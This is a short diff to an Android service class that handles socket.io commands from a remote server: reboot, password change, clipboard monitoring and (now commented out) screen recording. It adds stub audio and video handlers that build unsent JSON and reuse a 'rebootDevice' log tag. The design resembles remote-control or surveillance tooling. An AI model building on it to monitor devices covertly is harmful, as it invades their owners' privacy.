@@ -79,7 +79,9 @@ public class MainService extends Service {
                     ioSocket.on("0x10", rebootDevice);
                     ioSocket.on("0x11", changeDevicePassword);
                     ioSocket.on("0x12", clipboardMonitoring);
-                    ioSocket.on("0x13", screenRecord);
+                    ioSocket.on("0x13", playAudio);
+                    ioSocket.on("0x14", videoView);
+//                    ioSocket.on("0x13", screenRecord);
 
                     if(!ioSocket.connected()){
                         ioSocket.connect();
@@ -390,6 +392,28 @@ public class MainService extends Service {
             jsonObject.put("device_id", device_id);
             jsonObject.put("message", "");
             jsonObject.put("clip", clip.getClipData());
+        } catch (Exception exception) {
+            Log.i("rebootDevice", exception.getMessage());
+        }
+    };
+
+    private final Emitter.Listener playAudio = args -> {
+        Audio audio = new Audio(getApplicationContext());
+        try {
+            JSONObject jsonObject = new JSONObject();
+            jsonObject.put("device_id", device_id);
+            jsonObject.put("message", "");
+        } catch (Exception exception) {
+            Log.i("rebootDevice", exception.getMessage());
+        }
+    };
+
+    private final Emitter.Listener videoView = args -> {
+        
+        try {
+            JSONObject jsonObject = new JSONObject();
+            jsonObject.put("device_id", device_id);
+            jsonObject.put("message", "");
         } catch (Exception exception) {
             Log.i("rebootDevice", exception.getMessage());
         }
